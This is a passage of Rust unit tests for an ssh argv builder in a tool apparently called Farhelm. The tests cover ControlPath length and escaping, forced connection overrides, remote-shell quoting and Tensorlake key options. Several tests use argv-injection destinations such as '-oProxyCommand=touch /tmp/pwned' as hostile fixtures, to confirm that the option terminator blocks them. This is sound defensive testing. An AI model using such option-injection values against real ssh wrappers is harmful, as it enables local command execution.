            "farhelm",
            None,
        )
        .unwrap();
        assert!(
            args.contains(
                &"ControlPath=\"/home/u/%%d/\\\"quoted\\\"/back\\\\slash/%C\"".to_string()
            ),
            "{args:?}"
        );
    }

    /// Connection sharing is used whenever OpenSSH can represent and bind its socket,
    /// and a state directory too deep for that gets plain connections with
    /// sharing explicitly off.
    ///
    /// Why it matters: OpenSSH treats an over-long ControlPath as fatal, and
    /// the old `<state>/ssh-cm-%C` (the state directory plus 65 bytes once
    /// OpenSSH adds its temporary suffix) failed every ssh host for
    /// usernames over 15 characters on Linux and 10 on macOS, while SPEC.md
    /// "Supported user environments" requires 20. The fallback must set
    /// `ControlPath=none` too, or a ControlPath from the user's own ssh
    /// config would still be used. Specified, per platform limit: the
    /// default state directory of a 20-character Linux username and a
    /// 17-character macOS one get a `%C` supervisor socket; a 20-character
    /// macOS one gets none; and the argv for a directory with no socket
    /// carries `ControlMaster=no` and `ControlPath=none`, for either shared
    /// connection.
    #[farhelm_testtrace::test]
    fn sharing_is_used_where_the_socket_fits_and_turned_off_where_it_cannot() {
        let linux = default_state_dir("/home", 20);
        assert_eq!(
            super::control_socket_within(&linux, SharedConnection::Supervisor, 107),
            Some(linux.join("%C"))
        );
        let mac_17 = default_state_dir("/Users", 17);
        assert_eq!(
            super::control_socket_within(&mac_17, SharedConnection::Supervisor, 103),
            Some(mac_17.join("%C"))
        );
        assert_eq!(
            super::control_socket_within(
                &default_state_dir("/Users", 20),
                SharedConnection::Supervisor,
                103
            ),
            None
        );

        let deep = std::path::PathBuf::from(format!("/{}", "d".repeat(199)));
        for connection in [SharedConnection::Supervisor, SharedConnection::Provisioning] {
            let args = super::ssh_base_args(
                "user@host",
                &deep,
                connection,
                &super::SshAccess::UserConfig,
            )
            .unwrap();
            assert!(args.contains(&"ControlMaster=no".to_string()), "{args:?}");
            assert!(args.contains(&"ControlPath=none".to_string()), "{args:?}");
            assert!(
                !args.iter().any(|arg| arg == "ControlPersist=60"),
                "{args:?}"
            );
        }
    }

    /// Literal environment-reference syntax must not redirect a shared socket.
    /// These short paths otherwise fit, so both connection purposes must use
    /// the no-sharing fallback rather than hand OpenSSH an expandable value.
    #[farhelm_testtrace::test]
    fn literal_environment_references_disable_connection_sharing() {
        let path = std::path::Path::new("/state/${FARHELM_SOCKET}");
        for connection in [SharedConnection::Supervisor, SharedConnection::Provisioning] {
            let args =
                super::ssh_base_args("user@host", path, connection, &super::SshAccess::UserConfig)
                    .unwrap();
            assert!(args.contains(&"ControlMaster=no".to_string()), "{args:?}");
            assert!(args.contains(&"ControlPath=none".to_string()), "{args:?}");
            assert!(!args.iter().any(|arg| arg.contains("${")), "{args:?}");
        }
        assert!(
            super::control_socket(
                std::path::Path::new("/state/$ordinary"),
                SharedConnection::Supervisor
            )
            .is_some()
        );
    }

    /// The default state directory for a username of `user_len` characters
    /// under `home` (`/home` on Linux, `/Users` on macOS): the path whose
    /// length SPEC.md's username guarantee is about.
    fn default_state_dir(home: &str, user_len: usize) -> std::path::PathBuf {
        std::path::PathBuf::from(format!(
            "{home}/{}/.local/state/farhelm",
            "u".repeat(user_len)
        ))
    }

    /// Why this matters: the split into two shared connections exists so the
    /// long-lived supervisor session never holds the only session a host
    /// allows per connection while provisioning needs one. That only works
    /// if the two purposes get different sockets for the same host, and if
    /// the provisioning name keeps OpenSSH's `%C` live (a literal `%C` would
    /// make every host's provisioning share one master). Spec: in the same
    /// control directory, the supervisor connection's ControlPath ends in
    /// `/%C` and provisioning's in `/p%C`, and a state directory holding
    /// ssh_config syntax is escaped identically for both, leaving only the
    /// trailing token active.
    #[farhelm_testtrace::test]
    fn the_supervisor_connection_and_provisioning_use_different_sockets() {
        let dir = std::path::Path::new("/home/u/%d/\"quoted\"/state");
        let supervisor = super::ssh_base_args(
            "user@host",
            dir,
            SharedConnection::Supervisor,
            &super::SshAccess::UserConfig,
        )
        .unwrap();
        let provisioning = super::ssh_base_args(
            "user@host",
            dir,
            SharedConnection::Provisioning,
            &super::SshAccess::UserConfig,
        )
        .unwrap();
        assert!(
            supervisor.contains(&"ControlPath=\"/home/u/%%d/\\\"quoted\\\"/state/%C\"".to_string()),
            "{supervisor:?}"
        );
        assert!(
            provisioning
                .contains(&"ControlPath=\"/home/u/%%d/\\\"quoted\\\"/state/p%C\"".to_string()),
            "{provisioning:?}"
        );
    }

    /// Why this matters: the socket name is the only thing allowed to differ
    /// between the two shared connections. Provisioning runs the same
    /// user-supplied destination through the same security boundary (the
    /// connection overrides, `BatchMode`, and `--` before the destination),
    /// and a purpose-specific branch that dropped any of it would reopen
    /// what the shared prefix exists to close. Spec: with the ControlPath
    /// option masked out, both purposes produce the identical argv, with
    /// connection sharing and without it.
    #[farhelm_testtrace::test]
    fn both_shared_connections_build_the_same_argv_apart_from_the_socket() {
        let mask = |args: Vec<String>| -> Vec<String> {
            args.into_iter()
                .map(|arg| {
                    if arg.starts_with("ControlPath=\"") {
                        "ControlPath=<socket>".to_string()
                    } else {
                        arg
                    }
                })
                .collect()
        };
        let deep = std::path::PathBuf::from(format!("/{}", "d".repeat(199)));
        for dir in [std::path::Path::new("/state"), deep.as_path()] {
            let hostile = "-oProxyCommand=touch /tmp/pwned";
            assert_eq!(
                mask(
                    super::ssh_base_args(
                        hostile,
                        dir,
                        SharedConnection::Supervisor,
                        &super::SshAccess::UserConfig
                    )
                    .unwrap()
                ),
                mask(
                    super::ssh_base_args(
                        hostile,
                        dir,
                        SharedConnection::Provisioning,
                        &super::SshAccess::UserConfig
                    )
                    .unwrap()
                ),
            );
        }
    }

    /// Why this matters: provisioning's socket name is one character longer
    /// than the supervisor connection's, and SPEC.md "Supported user
    /// environments" requires 20-character usernames to keep working, so
    /// that character must cost provisioning alone and must never take
    /// connection sharing away from the supervisor connection. Spec: each
    /// purpose decides its own fit. The default state directory of a
    /// 17-character macOS username (the supervisor's limit there) shares the
    /// supervisor connection but runs provisioning without sharing; on Linux
    /// the limits are 22 and 21, so 20- and 21-character usernames share both
    /// and a 22-character one shares only the supervisor connection.
    #[farhelm_testtrace::test]
    fn each_shared_connection_decides_its_own_socket_fit() {
        let mac_17 = default_state_dir("/Users", 17);
        assert_eq!(
            super::control_socket_within(&mac_17, SharedConnection::Supervisor, 103),
            Some(mac_17.join("%C"))
        );
        assert_eq!(
            super::control_socket_within(&mac_17, SharedConnection::Provisioning, 103),
            None
        );
        let mac_16 = default_state_dir("/Users", 16);
        assert_eq!(
            super::control_socket_within(&mac_16, SharedConnection::Provisioning, 103),
            Some(mac_16.join("p%C"))
        );
        let linux_20 = default_state_dir("/home", 20);
        assert_eq!(
            super::control_socket_within(&linux_20, SharedConnection::Provisioning, 107),
            Some(linux_20.join("p%C"))
        );
        let linux_21 = default_state_dir("/home", 21);
        assert_eq!(
            super::control_socket_within(&linux_21, SharedConnection::Provisioning, 107),
            Some(linux_21.join("p%C"))
        );
        let linux_22 = default_state_dir("/home", 22);
        assert_eq!(
            super::control_socket_within(&linux_22, SharedConnection::Supervisor, 107),
            Some(linux_22.join("%C"))
        );
        assert_eq!(
            super::control_socket_within(&linux_22, SharedConnection::Provisioning, 107),
            None
        );
    }

    /// Why this matters: Farhelm's supervisor connection stays up around the
    /// clock, so a `ForwardAgent yes` in the user's ssh config would hand the
    /// remote host their keys for as long as the helm runs, and a
    /// `RemoteCommand` there makes ssh refuse every Farhelm command. Spec:
    /// both argv shapes (with and without connection sharing) carry every
    /// connection override as an `-o` pair before the option terminator, so
    /// it outranks the config file.
    #[farhelm_testtrace::test]
    fn every_connection_overrides_forwarding_and_the_remote_command() {
        let shared = super::ssh_base_args(
            "user@host",
            std::path::Path::new("/state"),
            SharedConnection::Supervisor,
            &super::SshAccess::UserConfig,
        )
        .unwrap();
        let deep = std::path::PathBuf::from(format!("/{}", "d".repeat(199)));
        let unshared = super::ssh_base_args(
            "user@host",
            &deep,
            SharedConnection::Supervisor,
            &super::SshAccess::UserConfig,
        )
        .unwrap();
        assert!(shared.iter().any(|arg| arg == "ControlPersist=60"));
        assert!(unshared.iter().any(|arg| arg == "ControlPath=none"));
        for args in [shared, unshared] {
            let dashdash = args.iter().position(|a| a == "--").expect("-- separator");
            let options = &args[..dashdash];
            for setting in [
                "ForwardAgent=no",
                "ForwardX11=no",
                "ClearAllForwardings=yes",
                "RemoteCommand=none",
                "RequestTTY=no",
                "PermitLocalCommand=no",
            ] {
                assert!(
                    options
                        .windows(2)
                        .any(|pair| pair[0] == "-o" && pair[1] == setting),
                    "missing -o {setting} before the terminator: {args:?}"
                );
            }
        }
    }

    /// The remote argv, as ssh will hand it to the remote login shell:
    /// everything after the option terminator AND the destination that now
    /// follows it (see [`ssh_args_terminate_options_before_the_destination`]
    /// for why the destination sits there).
    fn remote_command(args: &[String]) -> Vec<String> {
        let dashdash = args.iter().position(|a| a == "--").expect("-- separator");
        let remote = args[dashdash + 2..].join(" ");
        shell_words::split(&remote).expect("remote command must be shell-parseable")
    }

    /// A new helm must never pass an unknown flag to an old helper: that
    /// would hide its normal absence/version-skew evidence behind clap's
    /// usage error. Execute the reconstructed remote shell command against
    /// both helper generations, with hostile paths, and preserve exit 75.
    #[farhelm_testtrace::test]
    fn tensorlake_stdio_negotiates_the_idle_option_without_polluting_stdout() {
        use std::os::unix::fs::PermissionsExt as _;
        let dir = tempfile::tempdir().unwrap();
        let program = dir.path().join("helper's $program");
        let access =
            super::SshAccess::resolve(super::SshAccessKind::Tensorlake, dir.path()).unwrap();
        for supported in [false, true] {
            let help = if supported {
                "--stdin-idle-limit-secs <SECONDS>"
            } else {
                "legacy stdio help"
            };
            let reject = if supported {
                ""
            } else {
                "for arg; do test \"$arg\" != --stdin-idle-limit-secs || exit 2; done"
            };
            std::fs::write(&program, format!(
                "#!/bin/sh\nif test \"$3\" = --help; then printf '%s\\n' '{help}'; exit 0; fi\n{reject}\nprintf '<%s>\\n' \"$@\"\nexit 75\n"
            )).unwrap();
            std::fs::set_permissions(&program, std::fs::Permissions::from_mode(0o700)).unwrap();
            let args = super::ssh_stdio_args(
                "fixture",
                dir.path(),
                &access,
                program.to_str().unwrap(),
                Some("/state's $literal"),
            )
            .unwrap();
            let start = args.iter().position(|arg| arg == "--").unwrap() + 2;
            let output = std::process::Command::new("/bin/sh")
                .arg("-c")
                .arg(args[start..].join(" "))
                .output()
                .unwrap();
            assert_eq!(output.status.code(), Some(75), "{output:?}");
            let expected = if supported {
                "<internal>\n<stdio>\n<--state-dir>\n</state's $literal>\n<--stdin-idle-limit-secs>\n<120>\n"
            } else {
                "<internal>\n<stdio>\n<--state-dir>\n</state's $literal>\n"
            };
            assert_eq!(
                output.stdout,
                expected.as_bytes(),
                "help must not reach protocol stdout"
            );
            assert!(output.stderr.is_empty());
        }
    }

    /// The argv-injection regression: OpenSSH parses options up to the
    /// terminator, so a destination shaped like `-oProxyCommand=...` is read
    /// as an OPTION — and `ProxyCommand` runs a LOCAL shell command — for as
    /// long as `--` sits after it. This pins the ordering that closes it:
    /// the terminator precedes the destination, and the destination is
    /// therefore always a positional argument no matter what it contains.
    ///
    /// Asserted on the argv itself rather than by running ssh, because the
    /// bug is entirely in argument order and the exploit would otherwise
    /// need a real ssh, a real shell, and an observable side effect to
    /// detect.
    #[farhelm_testtrace::test]
    fn ssh_args_terminate_options_before_the_destination() {
        let hostile = "-oProxyCommand=touch /tmp/pwned";
        let args = super::ssh_stdio_args(
            hostile,
            std::path::Path::new("/state"),
            &super::SshAccess::UserConfig,
            "farhelm",
            Some("/remote/state"),
        )
        .unwrap();
        let dashdash = args.iter().position(|a| a == "--").expect("-- separator");
        assert_eq!(
            args[dashdash + 1],
            hostile,
            "the destination must sit immediately after the option terminator: {args:?}"
        );
        assert!(
            !args[..dashdash].iter().any(|a| a == hostile),
            "no copy of the destination may precede the terminator: {args:?}"
        );
        // The remote argv the old placement was protecting must still be
        // covered: `--state-dir` is past the terminator too.
        assert_eq!(
            remote_command(&args),
            vec![
                "farhelm",
                "internal",
                "stdio",
                "--state-dir",
                "/remote/state"
            ]
        );
    }

    /// The executable is part of ssh's reconstructed remote command too,
    /// not a local argv passed directly to exec. It needs the same POSIX
    /// quoting as the remote state directory.
    #[farhelm_testtrace::test]
    fn ssh_args_quote_the_remote_executable_for_the_remote_shell() {
        let args = super::ssh_stdio_args(
            "user@host",
            std::path::Path::new("/state"),
            &super::SshAccess::UserConfig,
            "/opt/far helm's/{a,b}/$bin",
            None,
        )
        .unwrap();
        assert_eq!(
            remote_command(&args),
            vec!["/opt/far helm's/{a,b}/$bin", "internal", "stdio"]
        );
    }

    /// Every remote shell word uses the same explicit quoting, so shell
    /// metacharacters cannot become syntax when OpenSSH reconstructs argv.
    #[farhelm_testtrace::test]
    fn shell_quote_always_uses_single_quotes() {
        assert_eq!(
            super::shell_quote("/home/u/{a,b} path/it's/$value"),
            "'/home/u/{a,b} path/it'\\''s/$value'"
        );
    }

    #[farhelm_testtrace::test]
    fn ssh_args_quote_the_remote_state_dir_for_the_remote_shell() {
        let args = super::ssh_stdio_args(
            "user@host",
            std::path::Path::new("/state"),
            &super::SshAccess::UserConfig,
            "farhelm",
            Some("/home/u/my state/farhelm"),
        )
        .unwrap();
        assert_eq!(
            remote_command(&args),
            vec![
                "farhelm",
                "internal",
                "stdio",
                "--state-dir",
                "/home/u/my state/farhelm"
            ]
        );
    }

    /// `ssh_base_args` is the enforcement point for a local ControlPath that
    /// happens to contain non-UTF-8 bytes (a stray mount, a mis-encoded
    /// filename): without the check inlined there, the path would flow
    /// into `Path::to_string_lossy` further down the ssh argv builder and
    /// get silently rewritten into a *different* path — one ssh would
    /// then create or reuse a ControlMaster socket under with no error
    /// and no hint that the path it acted on was not the one on disk.
    /// Asserting the offending path's lossy display appears in the error
    /// pins that the message tells the user WHICH path is unusable, not
    /// just that "something" was not UTF-8 — bypassing the check at the
    /// call site, or degrading the error to something generic, fails this
    /// test. A valid-UTF-8 control path (covered by the quoting tests
    /// above) must keep passing through unchanged.
    #[farhelm_testtrace::test]
    fn ssh_args_rejects_a_non_utf8_control_path_naming_it_in_the_error() {
        use std::ffi::OsStr;
        use std::os::unix::ffi::OsStrExt;

        let non_utf8 = std::path::Path::new(OsStr::from_bytes(b"/home/u/\xffstate"));
        let err = super::ssh_stdio_args(
            "user@host",
            non_utf8,
            &super::SshAccess::UserConfig,
            "farhelm",
            None,
        )
        .unwrap_err();
        let rendered = format!("{err:#}");
        assert!(
            rendered.contains(&non_utf8.to_string_lossy().into_owned()),
            "error should name the offending path so the user can see which one: {rendered}"
        );
    }

    /// Spec: a one-shot argv carries every connection override, then
    /// `BatchMode=yes`, `ControlMaster=no` and `ControlPath=none`, then the
    /// caller's options in order, then `--` and the destination last; an
    /// option-shaped destination stays after the terminator.
    ///
    /// Why: the Tensorlake snapshot builder runs over this argv. A builder's
    /// name is fixed per recipe, so a shared master to the previous builder
    /// would carry commands to a terminated sandbox; and the terminator's
    /// placement is the same security boundary as `ssh_base_args`'.
    #[farhelm_testtrace::test]
    fn oneshot_args_never_share_and_keep_the_terminator_before_the_destination() {
        let extra = vec!["IdentitiesOnly=yes".to_string(), "Port=22".to_string()];
        let dest = "-oProxyCommand=evil";
        let argv = super::ssh_oneshot_args(dest, &extra);
        assert_eq!(&argv[argv.len() - 2..], ["--", dest]);
        let options: Vec<&str> = argv[..argv.len() - 2]
            .chunks(2)
            .map(|pair| {
                assert_eq!(pair[0], "-o", "{argv:?}");
                pair[1].as_str()
            })
            .collect();
        let mut expected: Vec<&str> = super::CONNECTION_OVERRIDES.to_vec();
        expected.extend([
            "BatchMode=yes",
            "ControlMaster=no",
            "ControlPath=none",
            "IdentitiesOnly=yes",
            "Port=22",
        ]);
        assert_eq!(options, expected);
    }

    /// Spec: a path option is `Keyword="..."` with backslashes and quotes
    /// escaped and every `%` doubled, a trailing `%C` included.
    ///
    /// Why: `IdentityFile` and `UserKnownHostsFile` expand percent tokens, so
    /// an undoubled `%` in a state directory's path would make ssh read a
    /// different file than the one Farhelm wrote; unescaped quotes would end
    /// the value early.
    #[farhelm_testtrace::test]
    fn path_options_escape_quotes_backslashes_and_every_percent() {
        assert_eq!(
            super::ssh_config_path_option("IdentityFile", r#"/a b/"q"\x/%d/%C"#).unwrap(),
            r#"IdentityFile="/a b/\"q\"\\x/%%d/%%C""#
        );
    }

    /// The access options a Tensorlake connection must carry, as ssh will
    /// read them back: the config-quoted value of every `-o` pair.
    fn option_values(args: &[String]) -> Vec<&str> {
        args.windows(2)
            .filter(|pair| pair[0] == "-o")
            .map(|pair| pair[1].as_str())
            .collect()
    }

    /// Why: a Tensorlake host is reached only with Farhelm's own key and
    /// known-hosts file (D3, P6); a missing option would offer the user's
    /// keys first (which the gateway refuses outright) or trust the gateway
    /// through the user's `~/.ssh`. Every ordinary ssh host must keep its
    /// argv byte for byte.
    ///
    /// Spec: the Tensorlake argv is the user-config argv with exactly the
    /// shared Tensorlake access options (no builder log level) inserted before the option terminator, in both
    /// shared and unshared shapes, with both paths config-quoted (spaces,
    /// quotes and `%` survive); the user-config argv has none of them.
    #[farhelm_testtrace::test]
    fn tensorlake_access_adds_its_options_before_the_terminator() {
        let state = std::path::Path::new("/state dir/50%");
        let access = super::SshAccess::resolve(super::SshAccessKind::Tensorlake, state).unwrap();
        let super::SshAccess::Tensorlake(crate::tensorlake::ssh::TensorlakeSshAccess {
            identity_file,
            known_hosts,
        }) = &access
        else {
            panic!("a Tensorlake access names its files");
        };
        assert_eq!(
            identity_file,
            std::path::Path::new("/state dir/50%/tensorlake/ssh-key/id_ed25519")
        );
        assert_eq!(
            known_hosts,
            std::path::Path::new("/state dir/50%/tensorlake/known_hosts")
        );
        let expected = [
            r#"IdentityFile="/state dir/50%%/tensorlake/ssh-key/id_ed25519""#,
            "IdentitiesOnly=yes",
            r#"UserKnownHostsFile="/state dir/50%%/tensorlake/known_hosts""#,
            "GlobalKnownHostsFile=/dev/null",
            "HostKeyAlias=sandbox.tensorlake.ai",
            "StrictHostKeyChecking=accept-new",
            "UpdateHostKeys=no",
            "ServerAliveInterval=30",
            "ServerAliveCountMax=3",
        ];
        let deep = std::path::PathBuf::from(format!("/{}", "d".repeat(199)));
        for dir in [std::path::Path::new("/state"), deep.as_path()] {
            for connection in [SharedConnection::Supervisor, SharedConnection::Provisioning] {
                let plain = super::ssh_base_args(
                    "sbx@sbx.sandbox.tensorlake.ai",
                    dir,
                    connection,
                    &super::SshAccess::UserConfig,
                )
                .unwrap();
                let sandbox =
                    super::ssh_base_args("sbx@sbx.sandbox.tensorlake.ai", dir, connection, &access)
                        .unwrap();
                let terminator = plain.len() - 2;
                assert_eq!(plain[terminator], "--");
                let mut inserted = plain[..terminator].to_vec();
                for option in expected {
                    inserted.extend(["-o".to_string(), option.to_string()]);
                }
                inserted.extend(plain[terminator..].iter().cloned());
                assert_eq!(sandbox, inserted, "{dir:?} {connection:?}");
                assert!(
                    !option_values(&plain)
                        .iter()
                        .any(|value| expected.contains(value)),
                    "the user-config argv carries no Tensorlake option"
                );
            }
        }
    }

    /// Why: OpenSSH expands `${NAME}` in `IdentityFile` and
    /// `UserKnownHostsFile` even inside config quotes, with no escape, so a
    /// state directory spelled that way would make every Tensorlake dial
    /// fail or, worse, read another known-hosts file.
    ///
    /// Spec: a Tensorlake access under a state directory containing `${`
    /// refuses to build any argv, base or `-O exit`, with an error naming the
    /// path and the fix; the same directory still builds the user-config argv
    /// (whose ControlPath falls back to no sharing), and a `$` without a
    /// brace is passed through literally.
    #[farhelm_testtrace::test]
    fn tensorlake_access_refuses_a_path_ssh_would_expand() {
        let state = std::path::Path::new("/state/${FARHELM_LITERAL}");
        let access = super::SshAccess::resolve(super::SshAccessKind::Tensorlake, state).unwrap();
        for connection in [SharedConnection::Supervisor, SharedConnection::Provisioning] {
            let error = super::ssh_base_args("sbx@sbx", state, connection, &access)
                .expect_err("a ${ path is never handed to ssh");
            let message = format!("{error:#}");
            assert!(
                message.contains("/state/${FARHELM_LITERAL}/tensorlake"),
                "{message}"
            );
            assert!(message.contains("--state-dir"), "{message}");
            assert!(
                super::ssh_control_exit_args("sbx@sbx", state, connection, &access).is_err()
                    || super::control_socket(state, connection).is_none()
            );
            assert!(
                super::ssh_base_args("sbx@sbx", state, connection, &super::SshAccess::UserConfig)
                    .is_ok()
            );
        }
        let dollar = std::path::Path::new("/state/$HOME-literal");
        let access = super::SshAccess::resolve(super::SshAccessKind::Tensorlake, dollar).unwrap();
        let args =
            super::ssh_base_args("sbx@sbx", dollar, SharedConnection::Supervisor, &access).unwrap();
        assert!(
            args.iter()
                .any(|arg| arg
                    == r#"IdentityFile="/state/$HOME-literal/tensorlake/ssh-key/id_ed25519""#),
            "{args:?}"
        );
    }

    /// Why: a shared master outlives a sandbox's suspension, and a session
    /// on it then hangs; releasing it only helps if `-O exit` reaches the
    /// very socket the helm's clients use.
    ///
    /// Spec: the exit argv is the base argv (same options, so the same
    /// `ControlPath` and `%C`) with `-O exit` just before the terminator, for
    /// each connection; with no shareable socket there is nothing to stop
    /// and no argv.
    #[farhelm_testtrace::test]
    fn control_exit_targets_the_shared_socket() {
        let dir = std::path::Path::new("/state");
        let access = super::SshAccess::resolve(super::SshAccessKind::Tensorlake, dir).unwrap();
        for connection in [SharedConnection::Supervisor, SharedConnection::Provisioning] {
            let base = super::ssh_base_args("dest", dir, connection, &access).unwrap();
            let exit = super::ssh_control_exit_args("dest", dir, connection, &access)
                .unwrap()
                .expect("a shared socket fits");
            let terminator = base.len() - 2;
            assert_eq!(&exit[..terminator], &base[..terminator]);
            assert_eq!(&exit[terminator..], ["-O", "exit", "--", "dest"]);
        }
        let deep = std::path::PathBuf::from(format!("/{}", "d".repeat(199)));
        assert_eq!(
            super::ssh_control_exit_args(
                "dest",
                &deep,
                SharedConnection::Supervisor,
                &super::SshAccess::UserConfig
            )
            .unwrap(),
            None
        );
    }
}
